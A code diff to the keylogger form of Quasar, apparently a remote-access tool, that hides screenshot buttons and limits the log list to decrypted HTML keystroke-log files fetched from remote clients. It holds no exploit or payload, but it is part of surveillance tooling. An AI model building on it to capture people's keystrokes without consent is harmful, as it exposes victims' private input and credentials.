@@ -107,14 +107,21 @@ namespace Quasar.Server.Forms
         {
             RefreshLogsDirectory();
             btnGetLogs.Enabled = true;
-            btnGetScreenshots.Enabled = true;
-            btnClearScreenshots.Enabled = true;
+            // Screenshot management moved to FrmScreenlogger.
+            btnGetScreenshots.Enabled = false;
+            btnClearScreenshots.Enabled = false;
             stripLblStatus.Text = "Status: " + message;
         }
 
         private void FrmKeylogger_Load(object sender, EventArgs e)
         {
             this.Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
+
+            // Screenshot management is handled in a separate Screenlogging form.
+            btnGetScreenshots.Visible = false;
+            btnClearScreenshots.Visible = false;
+            btnGetScreenshots.Enabled = false;
+            btnClearScreenshots.Enabled = false;
 
             if (!Directory.Exists(_baseDownloadPath))
             {
@@ -134,8 +141,6 @@ namespace Quasar.Server.Forms
         private void btnGetLogs_Click(object sender, EventArgs e)
         {
             btnGetLogs.Enabled = false;
-            btnGetScreenshots.Enabled = false;
-            btnClearScreenshots.Enabled = false;
             stripLblStatus.Text = "Status: Retrieving logs...";
             _keyloggerHandler.RetrieveLogs();
         }
@@ -179,7 +184,9 @@ namespace Quasar.Server.Forms
 
             foreach (FileInfo file in iFiles)
             {
-                lstLogs.Items.Add(new ListViewItem {Text = file.Name});
+                // Keylogger files are saved as decrypted HTML.
+                if (string.Equals(file.Extension, ".html", StringComparison.OrdinalIgnoreCase))
+                    lstLogs.Items.Add(new ListViewItem { Text = file.Name });
             }
         }
     }
